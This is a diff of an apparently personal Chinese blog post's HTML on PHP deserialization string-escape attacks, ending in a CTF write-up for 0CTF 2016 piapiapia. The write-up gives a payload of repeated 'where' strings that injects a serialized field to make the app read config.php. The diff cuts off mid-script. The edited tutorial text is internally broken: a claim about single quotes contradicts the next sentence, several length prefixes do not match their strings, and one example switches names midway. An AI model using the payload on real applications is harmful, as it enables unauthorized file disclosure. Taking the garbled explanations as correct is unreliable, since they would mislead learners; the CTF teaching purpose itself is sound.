@@ -19,18 +19,21 @@
   <meta name="author" content="tuyi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="常见的字符串逃逸基本知识1.序列化字符串中的单引号 &#39; 必须用双引号 &quot; 包裹。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 unserialize() 报错。 2.再有特定的针对序列化后的字符串变长变短的情况下  在php中，反序列化 的过程中必须严格按照序列化规则才能成功实现反序列化，例如  1234567891011&lt;?php  	$str &#x3D; &amp;#x27">
+    <meta name="description" content="常见的字符串逃逸基本知识1.序列化字符串必须使用单引号 &#39;  包裹。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 unserialize() 报错。 2.再有特定的针对序列化后的字符串变长变短的情况下  在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如  1234567891011&lt;?php  	$str &#x3D; &#x27;a:2:&#123;i">
 <meta property="og:type" content="article">
 <meta property="og:title" content="反序列化之字符串逃逸">
 <meta property="og:url" content="https://blog.tuyiisxp.top/2025/02/05/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/index.html">
 <meta property="og:site_name" content="tuyi的小站">
-<meta property="og:description" content="常见的字符串逃逸基本知识1.序列化字符串中的单引号 &#39; 必须用双引号 &quot; 包裹。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 unserialize() 报错。 2.再有特定的针对序列化后的字符串变长变短的情况下  在php中，反序列化 的过程中必须严格按照序列化规则才能成功实现反序列化，例如  1234567891011&lt;?php  	$str &#x3D; &amp;#x27">
+<meta property="og:description" content="常见的字符串逃逸基本知识1.序列化字符串必须使用单引号 &#39;  包裹。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 unserialize() 报错。 2.再有特定的针对序列化后的字符串变长变短的情况下  在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如  1234567891011&lt;?php  	$str &#x3D; &#x27;a:2:&#123;i">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181546710.png">
+<meta property="og:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181638367.png">
 <meta property="article:published_time" content="2025-02-05T08:58:55.000Z">
-<meta property="article:modified_time" content="2025-02-05T09:03:23.517Z">
+<meta property="article:modified_time" content="2025-02-05T10:17:04.395Z">
 <meta property="article:author" content="tuyi">
 <meta property="article:tag" content="字符串逃逸">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250205181546710.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -231,7 +234,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.5k 字
+          2.1k 字
         
       </span>
     
@@ -242,7 +245,7 @@
         
         
         
-          13 分钟
+          18 分钟
         
       </span>
     
@@ -284,7 +287,7 @@
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年2月5日 下午
+                    本文最后更新于 2025年2月5日 晚上
                   
                 
               </p>
@@ -292,11 +295,10 @@
             
               <div class="markdown-body">
                 
-                <h2 id="常见的字符串逃逸"><a href="#常见的字符串逃逸" class="headerlink" title="常见的字符串逃逸"></a>常见的字符串逃逸</h2><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p>1.<strong>序列化字符串中的单引号 <code>&#39;</code> 必须用双引号 <code>&quot;</code> 包裹</strong>。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 <code>unserialize()</code> 报错。</p>
+                <h2 id="常见的字符串逃逸"><a href="#常见的字符串逃逸" class="headerlink" title="常见的字符串逃逸"></a>常见的字符串逃逸</h2><h4 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h4><p>1.<strong>序列化字符串必须使用单引号 <code>&#39;</code>  包裹</strong>。PHP 的序列化格式要求字符串部分使用双引号，否则会导致 <code>unserialize()</code> 报错。</p>
 <p>2.再有特定的针对序列化后的字符串变长变短的情况下</p>
 <ul>
-<li>在php中，反序列化</li>
-<li>的过程中必须严格按照序列化规则才能成功实现反序列化，例如</li>
+<li>在php中，反序列化的过程中必须严格按照序列化规则才能成功实现反序列化，例如</li>
 </ul>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  	<span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;a:2:&#123;i:0;s:4:&quot;flag&quot;;i:1;s:6:&quot;mikasa&quot;;&#125;&#x27;</span>;<br>  	<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">#输出结果</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">array(2)&#123;</span><br><span class="hljs-comment">	[0]=&gt; string(4) &quot;flag&quot;</span><br><span class="hljs-comment">  [1]=&gt; string(6) &quot;mikasa&quot;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure>
 
@@ -310,8 +312,8 @@
 </ul>
 <hr>
 <h4 id="php-反序列化-的几大特性"><a href="#php-反序列化-的几大特性" class="headerlink" title="php[反序列化]的几大特性"></a>php[反序列化]的几大特性</h4><ul>
-<li>PHP 在反序列化时，底层代码是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾（字符串除外）并且是根据长度判断内容的<ul>
-<li>注意点，很容易以为序列化后的字符串是<code>;&#125;</code>结尾，实际上字符串序列化是以<code>;&#125;</code>结尾的，但对象序列化是直接<code>&#125;</code>结尾</li>
+<li>PHP 在反序列化时，是以 <code>;</code> 作为字段的分隔，以 <code>&#125;</code> 作为结尾（字符串除外）并且是根据长度判断内容的<ul>
+<li>注意点: 很容易以为序列化后的字符串是<code>&#125;</code>结尾，实际上序列化字符串是以<code>;&#125;</code>结尾的，但对象序列化是直接<code>&#125;</code>结尾</li>
 <li>php反序列化字符逃逸，就是通过这个结尾符实现的</li>
 </ul>
 </li>
@@ -320,49 +322,49 @@
 <hr>
 <h4 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h4><p>反序列化之所以存在字符串逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。</p>
 <p>反序列化字符逃逸问题根据过滤函数一般分为两种，字符数增多和字符数减少</p>
-<h5 id="字符数增多"><a href="#字符数增多" class="headerlink" title="字符数增多"></a>字符数增多</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  			<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$str</span>);<br>		&#125;<br>		<br>		<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;mikasa&quot;</span>;<br>		<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;biubiu&quot;</span>;<br>		<span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>		<br>		<span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br>		<span class="hljs-comment">//$str2 = filter($_GET[&#x27;user&#x27;]);</span><br><br>		<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br>		<span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h5 id="字符数增多"><a href="#字符数增多" class="headerlink" title="字符数增多"></a>字符数增多</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  			<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;yy&#x27;</span>,<span class="hljs-variable">$str</span>);<br>		&#125;<br>		<br>		<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>		<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br>		<span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>		<br>		<span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br>		<span class="hljs-comment">//$str2 = filter($_GET[&#x27;user&#x27;]);</span><br><br>		<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br>		<span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>123456</code>，而不是<code>biubiu</code>？</p>
+<p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>654321</code>，而不是<code>123456</code>？</p>
 <ul>
-<li>正常情况下反序列化字符串**$str1**的值为<code>a:2:&#123;i:0;s:6:&quot;mikasa&quot;;i:1;s:6:&quot;biubiu&quot;;&#125;</code></li>
-<li>那么把username的值变为<code>mikasaxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:9:&quot;mikasayyyyyy&quot;;i:1;s:6:&quot;biubiu&quot;;&#125;</code><ul>
+<li>正常情况下反序列化字符串**$str1**的值为<code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li>
+<li>那么把username的值变为<code>adminxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:8:&quot;adminyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul>
 <li>因为比之前多了三个字符，反序列化时肯定是会失败的！</li>
 <li>所以，可以利用多出来的字符串做一些坏事？</li>
 </ul>
 </li>
-<li>想要password是<code>123456</code>，反序列化化前的字符串要是 <code>a:2:&#123;i:0;s:6:&quot;mikasa&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li>
-<li>如果说我们输入的是<ul>
-<li><code>a:2:&#123;i:0;s:26:&quot;mikasa&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;biubiu&quot;;&#125;</code></li>
-<li>多出的字段是 <code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code> 数一下是20个字符，</li>
-<li>一个x会导致多出一个字符，所以加上20个x，<code>&quot;;i:1;s:6:&quot;biubiu&quot;;&#125;</code>部分的内容会被当作无效部分被忽略？？？</li>
+<li>想要password是<code>654321</code>，反序列化化前的字符串要是 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li>
+<li>如果说最后的是<ul>
+<li><code>a:2:&#123;i:0;s:25:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>那么密码就会变成654321，<code>;&#125;</code>会被忽略</li>
+<li>要构建的字段是 <code>&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code> 数一下是20个字符，</li>
+<li>一个x会导致多出一个字符，所以加上20个x，<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code>部分的内容会被当作无效部分被忽略</li>
 </ul>
 </li>
 <li>所以最终输入是<ul>
-<li><code>a:2:&#123;i:0;s:46:&quot;mikasaxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code></li>
+<li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li>
 <li>filter之后，会变为</li>
-<li><code>a:2:&#123;i:0;s:46:&quot;mikasayyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;</code></li>
+<li><code>a:2:&#123;i:0;s:45:&quot;adminyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;654321&quot;;&#125;&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code></li>
 </ul>
 </li>
 </ul>
-<h5 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  			<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-variable">$str</span>);<br>		&#125;<br>		<br>		<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;mikasa&quot;</span>;<br>		<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;biubiu&quot;</span>;<br>		<span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>		<br>		<span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br>		<span class="hljs-comment">//$str2 = filter(serialize($_GET[&#x27;user&#x27;]));</span><br>		<br>		<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br>		<span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<h5 id="字符串减少"><a href="#字符串减少" class="headerlink" title="字符串减少"></a>字符串减少</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>  	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;<br>  			<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;xx&quot;</span>,<span class="hljs-string">&quot;y&quot;</span>,<span class="hljs-variable">$str</span>);<br>		&#125;<br>		<br>		<span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;admin&quot;</span>;<br>		<span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;123456&quot;</span>;<br>		<span class="hljs-variable">$user</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span>);<br>		<br>		<span class="hljs-variable">$str1</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br>		<span class="hljs-comment">//$str2 = filter(serialize($_GET[&#x27;user&#x27;]));</span><br>		<br>		<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str1</span>));<br>		<span class="hljs-comment">//var_dump(unserialize($str2));</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>123456</code>，而不是<code>biubiu</code>？</p>
+<p>问：如果我能控制进行反序列化的字符串，该如何使var_dump打印出来的password对应的值是<code>654321</code>，而不是<code>123456</code>？</p>
 <ul>
-<li>正常情况下反序列化字符串**$str1**的值为 <code>a:2:&#123;i:0;s:6:&quot;mikasa&quot;;i:1;s:6:&quot;biubiu&quot;;&#125;</code></li>
-<li>那么把username的值变为<code>mikasaxxxxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:12:&quot;mikasayyy&quot;;i:1;s:6:&quot;biubiu&quot;;&#125;</code><ul>
-<li>因为比之前少了三个字符，反序列化时肯定是会失败的,<code>mikasayyy</code>的长度为9，还会继续往后吞3个字符！但这样会造成语法错误！</li>
+<li>正常情况下反序列化字符串**$str1**的值为 <code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li>
+<li>那么把username的值变为<code>adminxxxxxx</code>，当完成序列化，filter函数处理后的结果为<code>a:2:&#123;i:0;s:11:&quot;adminyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code><ul>
+<li>因为比之前少了三个字符，反序列化时肯定是会失败的,<code>amdinyyy</code>的长度为8，还会继续往后吞3个字符！但这样会造成语法错误！</li>
 <li>所以，是否可以利用变化的字符长度做一些坏事？（吞掉原有的password值，再添加新值！）</li>
 </ul>
 </li>
-<li>构建的注入表达式是**（吞）**<ul>
-<li><code>a:2:&#123;i:0;s:**?**:&quot;mikasa&quot;;i:1;s:5:&quot;biubiu&quot;;&#125;**&quot;;i:1;s:6:&quot;123456&quot;;&#125;**</code></li>
-<li>所以要吞掉的内容是<code>&quot;;i:1;s:5:&quot;biubiu&quot;;&#125;</code> 一共是20个字符！所以需要添加40个x</li>
+<li>构建的注入表达式是<strong>后面部分需要可控</strong><ul>
+<li><code>a:2:&#123;i:0;s:5:&quot;admin&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li>
+<li>所以要吞掉的内容是<code>&quot;;i:1;s:6:&quot;123456&quot;;&#125;</code> 一共是20个字符！所以需要添加40个x</li>
 </ul>
 </li>
 <li>所以最终的输入时<ul>
-<li><code>a:2:&#123;i:0;s:46:&quot;mikasaxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:5:&quot;biubiu&quot;;&#125;**&quot;;i:1;s:6:&quot;123456&quot;;&#125;**</code></li>
+<li><code>a:2:&#123;i:0;s:45:&quot;adminxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li>
 <li>filter之后，会变为</li>
-<li><code>a:2:&#123;i:0;s:**46**:&quot;mikasayyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:5:&quot;biubiu&quot;;&#125;**&quot;;i:1;s:6:&quot;123456&quot;;&#125;**</code></li>
+<li><code>a:2:&#123;i:0;s:45:&quot;mikasayyyyyyyyyyyyyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&quot;;i:1;s:6:&quot;654321&quot;;&#125;</code></li>
 </ul>
 </li>
 </ul>
@@ -370,6 +372,36 @@
 <li>当字符增多：在输入的时候再加上精心构造的字符。经过过滤函数，字符变多之后，就把我们构造的给挤出来。从而实现字符逃逸</li>
 <li>当字符减少：在输入的时候再加上精心构造的字符。经过过滤函数，字符减少后，会把原有的吞掉，使构造的字符实现代替</li>
 </ul>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>[0CTF 2016]piapiapia</p>
+<p>先常规操作:看源码，查看robots.txt，disearch扫描，抓包</p>
+<p>sql没有反应，disearch发现<a target="_blank" rel="noopener" href="http://www.zip源码泄露/">www.zip源码泄露</a></p>
+<p>查看源码，发现flag在config.php文件里面，那么就需要文件包含</p>
+<p>在profile.php内里有函数file_get_content()函数，我们要构建参数为config.php</p>
+<p>读源码发现注册后上传的用户资料会被序列化然后对序列化后的代码进行过滤</p>
+<p>但是过滤后发生替换直接存储，然后直接调用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>		<span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>		<span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>		<span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br>		<span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>		<span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>		<span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>	&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现where被替换后存在字符串逃逸漏洞（变长）</p>
+<p>那么就可以把photo的文件名换成config,php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;name&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><br></code></pre></td></tr></table></figure>
+
+<p>我们要替换成</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">&quot;;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>长度33个那就要33个where</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-string">&#x27;12345678901&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;123@321.com&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]=<span class="hljs-string">&#x27;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;&#x27;</span>;<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;wokao&#x27;</span>;<br><br><br><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>    <span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span 